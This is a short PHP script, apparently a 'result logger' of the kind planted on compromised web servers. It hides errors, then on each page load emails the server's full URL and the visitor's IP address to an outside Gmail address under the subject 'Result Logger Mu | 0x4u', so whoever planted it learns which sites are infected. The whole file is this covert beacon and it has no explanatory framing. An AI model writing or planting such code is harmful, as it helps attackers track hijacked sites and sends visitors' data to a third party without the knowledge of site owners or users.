<?php
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
ini_set('memory_limit', '64M');
header('Content-Type: text/html; charset=UTF-8');
$to = 'r3ksec@gmail.com';
$path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$message = "URL: $path | IP Address :[ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($to, "Result Logger Mu | 0x4u", $message, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
?>